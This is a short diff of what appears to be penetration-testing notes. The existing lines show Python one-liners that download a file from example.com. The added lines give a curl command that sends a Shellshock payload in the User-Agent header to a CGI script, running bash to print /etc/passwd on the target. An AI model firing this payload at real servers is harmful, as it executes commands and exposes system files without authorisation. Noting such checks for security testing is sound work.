@@ -377,3 +377,6 @@ import urllib
 urllib.urlretrieve ("http://www.example.com/songs/mp3.mp3", "mp3.mp3")
 
 python -c 'import urllib;urllib.urlretrieve ("http://www.example.com/songs/mp3.mp3", "mp3.mp3")'
+
+Check for shell shock vulnerability:
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://<ip>/cgi-bin/underworld(vulnerable script)
